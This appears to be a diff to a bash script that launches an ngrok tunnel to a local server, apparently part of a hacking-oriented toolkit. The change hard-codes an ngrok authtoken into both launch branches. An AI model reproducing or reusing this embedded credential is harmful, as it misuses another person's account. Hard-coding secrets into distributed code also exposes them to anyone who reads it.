@@ -463,9 +463,11 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
+	sleep 2 && termux-chroot ./.server/ngrok authtoken 23BZ8zTkDPntJEZ7ZP6QUtdyvnA_5qSntEQTMfDYn3e9wKsQy > /dev/null 2>&1 &
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
     else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok authtoken 23BZ8zTkDPntJEZ7ZP6QUtdyvnA_5qSntEQTMfDYn3e9wKsQy > /dev/null 2>&1 &
+	sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
